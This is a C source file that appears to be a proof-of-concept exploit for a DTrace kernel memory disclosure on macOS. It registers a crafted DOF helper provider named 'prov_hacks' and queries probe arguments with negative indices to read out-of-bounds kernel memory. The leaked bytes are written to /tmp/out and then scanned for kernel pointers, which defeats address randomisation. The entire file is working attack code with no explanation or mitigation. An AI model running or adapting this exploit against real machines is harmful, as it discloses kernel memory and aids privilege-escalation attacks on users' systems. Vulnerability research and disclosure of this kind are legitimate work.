#include "dtrace.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(__x86_64__)
#define MASK 0xffffff
#elif defined(__arm64__)
#define MASK 0xfffffe
#endif

#define FILENAME "/tmp/out"
// Here we control region we want to leak
#define DTARGG_MIN -1000
#define DTARGG_MAX 0
#define offsetof(type, field) __builtin_offsetof(type, field)

typedef struct {
    char provider_name[11];
    char trigger[8];
    char foo[508];
} program_strtab_t;

static const program_strtab_t program_strtab = { "prov_hacks", "trigger", "\x02\x00\x03\x00\x04\x00\x05\x00\x06\x00\x07\x00\x08\x00\x09\x00\x0a\x00\x0b\x00\x0c\x00\x0d\x00\x0e\x00\x0f\x00\x10\x00\x11\x00\x12\x00\x13\x00\x14\x00\x15\x00\x16\x00\x17\x00\x18\x00\x19\x00\x1a\x00\x1b\x00\x1c\x00\x1d\x00\x1e\x00\x1f\x00\x20\x00\x21\x00\x22\x00\x23\x00\x24\x00\x25\x00\x26\x00\x27\x00\x28\x00\x29\x00\x2a\x00\x2b\x00\x2c\x00\x2d\x00\x2e\x00\x2f\x00\x30\x00\x31\x00\x32\x00\x33\x00\x34\x00\x35\x00\x36\x00\x37\x00\x38\x00\x39\x00\x3a\x00\x3b\x00\x3c\x00\x3d\x00\x3e\x00\x3f\x00\x40\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x48\x00\x49\x00\x4a\x00\x4b\x00\x4c\x00\x4d\x00\x4e\x00\x4f\x00\x50\x00\x51\x00\x52\x00\x53\x00\x54\x00\x55\x00\x56\x00\x57\x00\x58\x00\x59\x00\x5a\x00\x5b\x00\x5c\x00\x5d\x00\x5e\x00\x5f\x00\x60\x00\x61\x00\x62\x00\x63\x00\x64\x00\x65\x00\x66\x00\x67\x00\x68\x00\x69\x00\x6a\x00\x6b\x00\x6c\x00\x6d\x00\x6e\x00\x6f\x00\x70\x00\x71\x00\x72\x00\x73\x00\x74\x00\x75\x00\x76\x00\x77\x00\x78\x00\x79\x00\x7a\x00\x7b\x00\x7c\x00\x7d\x00\x7e\x00\x7f\x00\x80\x00\x81\x00\x82\x00\x83\x00\x84\x00\x85\x00\x86\x00\x87\x00\x88\x00\x89\x00\x8a\x00\x8b\x00\x8c\x00\x8d\x00\x8e\x00\x8f\x00\x90\x00\x91\x00\x92\x00\x93\x00\x94\x00\x95\x00\x96\x00\x97\x00\x98\x00\x99\x00\x9a\x00\x9b\x00\x9c\x00\x9d\x00\x9e\x00\x9f\x00\xa0\x00\xa1\x00\xa2\x00\xa3\x00\xa4\x00\xa5\x00\xa6\x00\xa7\x00\xa8\x00\xa9\x00\xaa\x00\xab\x00\xac\x00\xad\x00\xae\x00\xaf\x00\xb0\x00\xb1\x00\xb2\x00\xb3\x00\xb4\x00\xb5\x00\xb6\x00\xb7\x00\xb8\x00\xb9\x00\xba\x00\xbb\x00\xbc\x00\xbd\x00\xbe\x00\xbf\x00\xc0\x00\xc1\x00\xc2\x00\xc3\x00\xc4\x00\xc5\x00\xc6\x00\xc7\x00\xc8\x00\xc9\x00\xca\x00\xcb\x00\xcc\x00\xcd\x00\xce\x00\xcf\x00\xd0\x00\xd1\x00\xd2\x00\xd3\x00\xd4\x00\xd5\x00\xd6\x00\xd7\x00\xd8\x00\xd9\x00\xda\x00\xdb\x00\xdc\x00\xdd\x00\xde\x00\xdf\x00\xe0\x00\xe1\x00\xe2\x00\xe3\x00\xe4\x00\xe5\x00\xe6\x00\xe7\x00\xe8\x00\xe9\x00\xea\x00\xeb\x00\xec\x00\xed\x00\xee\x00\xef\x00\xf0\x00\xf1\x00\xf2\x00\xf3\x00\xf4\x00\xf5\x00\xf6\x00\xf7\x00\xf8\x00\xf9\x00\xfa\x00\xfb\x00\xfc\x00\xfd\x00\xfe\x00\xff" };

dof_hdr_t* pack_dof()
{
    dof_hdr_t* dof = 0;
    dof_sec_t* sec = 0;
    const uint32_t secnum = 5;
    uint64_t secoff = 0;
    uint64_t dofs_offset = 0;
    uint64_t len = 0;
    size_t i = 0;
    dof_provider_t provider;
    dof_probe_t probes;
    uint8_t pr_args[2] = { 1, 0 };
    uint32_t pr_offs[2] = { 1, 0 };

    static struct {
        int section;
        char* buffer;
        uint_t bufsize;
        int entsize;
        int align;
        const char* msg;
    } info[5];

    memset(&provider, 0, sizeof(provider));
    memset(&probes, 0, sizeof(probes));

    info[0].section = DOF_SECT_PROVIDER;
    info[0].buffer = (char*)&provider;
    info[0].bufsize = sizeof(dof_provider_t);
    info[0].entsize = 0;
    info[0].align = sizeof(dof_secidx_t);
    info[0].msg = "provider";

    info[1].section = DOF_SECT_PROFFS;
    info[1].buffer = (char*)pr_offs;
    info[1].bufsize = sizeof(pr_offs);
    info[1].entsize = sizeof(uint32_t);
    info[1].align = sizeof(uint32_t);
    info[1].msg = "proffs";

    info[2].section = DOF_SECT_PROBES;
    info[2].buffer = (char*)&probes;
    info[2].bufsize = sizeof(probes);
    info[2].entsize = sizeof(dof_probe_t);
    info[2].align = sizeof(uint64_t);
    info[2].msg = "probes";

    info[3].section = DOF_SECT_PRARGS;
    info[3].buffer = (char*)&pr_args;
    info[3].bufsize = sizeof(pr_args);
    info[3].entsize = sizeof(uint8_t);
    info[3].align = sizeof(uint8_t);
    info[3].msg = "prargs";

    info[4].section = DOF_SECT_STRTAB;
    info[4].buffer = (char*)&program_strtab;
    info[4].bufsize = sizeof(program_strtab);
    info[4].entsize = 0;
    info[4].align = sizeof(char);
    info[4].msg = "strtab";

    provider.dofpv_proffs = 1;
    provider.dofpv_probes = 2;
    provider.dofpv_prargs = 3;
    provider.dofpv_strtab = 4;

    provider.dofpv_name = offsetof(program_strtab_t, provider_name);

    probes.dofpr_func = offsetof(program_strtab_t, trigger);
    probes.dofpr_name = offsetof(program_strtab_t, trigger);
    probes.dofpr_nargc = 1;
    probes.dofpr_xargc = 1;
    probes.dofpr_argidx = 0;
    probes.dofpr_offidx = 1;
    probes.dofpr_noffs = 1;
    probes.dofpr_nenoffs = 0;
    probes.dofpr_enoffidx = 0;
    probes.dofpr_nargv = 0;
    probes.dofpr_xargv = 0;
    secoff = sizeof(dof_hdr_t);
    dofs_offset = secoff;
    len = 0;
    for (i = 0; i < secnum; i++) {
        dofs_offset += roundup(sizeof(dof_sec_t), sizeof(uint64_t));
        len += roundup(info[i].bufsize, sizeof(uint64_t));
    }
    len += dofs_offset;

    dof = malloc(len);
    memset(dof, 0, len);
    dof->dofh_ident[DOF_ID_MAG0] = DOF_MAG_MAG0;
    dof->dofh_ident[DOF_ID_MAG1] = DOF_MAG_MAG1;
    dof->dofh_ident[DOF_ID_MAG2] = DOF_MAG_MAG2;
    dof->dofh_ident[DOF_ID_MAG3] = DOF_MAG_MAG3;

    dof->dofh_ident[DOF_ID_MODEL] = DOF_MODEL_NATIVE;
    dof->dofh_ident[DOF_ID_ENCODING] = DOF_ENCODE_NATIVE;
    dof->dofh_ident[DOF_ID_VERSION] = DOF_VERSION;
    dof->dofh_ident[DOF_ID_DIFVERS] = DIF_VERSION;
    dof->dofh_ident[DOF_ID_DIFIREG] = DIF_DIR_NREGS;
    dof->dofh_ident[DOF_ID_DIFTREG] = DIF_DTR_NREGS;

    dof->dofh_flags = 0;
    dof->dofh_hdrsize = sizeof(dof_hdr_t);
    dof->dofh_secsize = sizeof(dof_sec_t);
    dof->dofh_secnum = secnum;
    dof->dofh_secoff = secoff;
    dof->dofh_loadsz = len;
    dof->dofh_filesz = len;
    dof->dofh_pad = 0;

    for (i = 0; i < secnum; i++) {
        sec = (dof_sec_t*)((uintptr_t)dof + secoff);
        sec->dofs_type = info[i].section;
        sec->dofs_align = info[i].align;
        sec->dofs_flags = DOF_SECF_LOAD;
        sec->dofs_entsize = info[i].entsize;
        sec->dofs_offset = dofs_offset;
        sec->dofs_size = info[i].bufsize;
        memcpy((void*)((uintptr_t)dof + dofs_offset), info[i].buffer,
            info[i].bufsize);
        secoff += roundup(sizeof(dof_sec_t), sizeof(uint64_t));
        dofs_offset += roundup(info[i].bufsize, sizeof(uint64_t));
    }

    return dof;
}

void register_helper()
{
    int fd, err;
    dtrace_difo_t* difo;
    dof_hdr_t* dof;
    dof_ioctl_data_t* ioctl_data = 0;
    int rv = 1;
    int result;

    ioctl_data = malloc(sizeof(dof_ioctl_data_t));
    dof = pack_dof();

    ioctl_data->dofiod_count = 1;
    strcpy(ioctl_data->dofiod_helpers[0].dofhp_mod, "helper");
    ioctl_data->dofiod_helpers[0].dofhp_addr = (uint64_t)dof;
    ioctl_data->dofiod_helpers[0].dofhp_dof = (uint64_t)dof;

    fd = open("/dev/dtracehelper", O_RDWR);
    err = errno;

    fcntl(fd, F_SETFD, FD_CLOEXEC);

    rv = 1;

    result = ioctl(fd, DTRACEHIOC_ADDDOF, &ioctl_data, &rv);
    err = errno;
    printf("%d\n", result);
}
int get_probe_id(int fd)
{
    for (size_t dtargd_id = 0; dtargd_id < SIZE_MAX; dtargd_id++) {
        dtrace_argdesc_t arg;
        bzero(&arg, sizeof(dtrace_argdesc_t));
        arg.dtargd_id = dtargd_id;
        arg.dtargd_ndx = 0;

        ioctl(fd, DTRACEIOC_PROBEARG, &arg);
        if (strnlen(arg.dtargd_xlate, 1) > 0 || strnlen(arg.dtargd_native, 1) > 0) {
            if (strncmp(arg.dtargd_xlate, "prov_hacks", 11) == 0) {
                return dtargd_id;
            }
        }
    }
    return 0;
}

void call_probe(int fd, size_t dtargd_id)
{
    FILE* ptr;
    ptr = fopen(FILENAME, "wb");
    for (int dtargd_ndx = DTARGG_MIN; dtargd_ndx < DTARGG_MAX; dtargd_ndx++) {
        dtrace_argdesc_t arg;
        bzero(&arg, sizeof(dtrace_argdesc_t));
        arg.dtargd_id = dtargd_id;
        arg.dtargd_ndx = dtargd_ndx;

        ioctl(fd, DTRACEIOC_PROBEARG, &arg);
        if (strnlen(arg.dtargd_native, 1) > 0) {
            if (strncmp(arg.dtargd_native, "prov_hacks", 11) == 0) {
                fwrite("\x00", 1, 1, ptr);
            } else if (strncmp(arg.dtargd_native, "trigger", 8) == 0) {
                fwrite("\x01", 1, 1, ptr);
            } else {
                fprintf(ptr, "%s", arg.dtargd_native);
            }
        } else {
            fwrite(arg.dtargd_native, 1, 1, ptr);
        }
    }
    fclose(ptr);
}
void poc()
{
    int fd;
    int probe_id;

    fd = open("/dev/dtrace", O_RDWR);
    register_helper();
    fcntl(fd, F_SETFD, FD_CLOEXEC);

    probe_id = get_probe_id(fd);
    call_probe(fd, probe_id);
}
void read_pointers()
{
    FILE* ptr;
    size_t size;
    char* arr;

    ptr = fopen(FILENAME, "rb");
    fseek(ptr, 0, SEEK_END);
    size = ftell(ptr);
    arr = malloc(size);

    rewind(ptr);
    fread(arr, size, 1, ptr);

    for (size_t i = 0; i < (size - 8); i++) {
        size_t val = *(size_t*)(arr + i);
        if ((val >> (5 * 8)) == MASK) {
            printf("%p\n", (size_t*)val);
        }
    }
}
int main()
{
    poc();
    read_pointers();
    return 0;
}
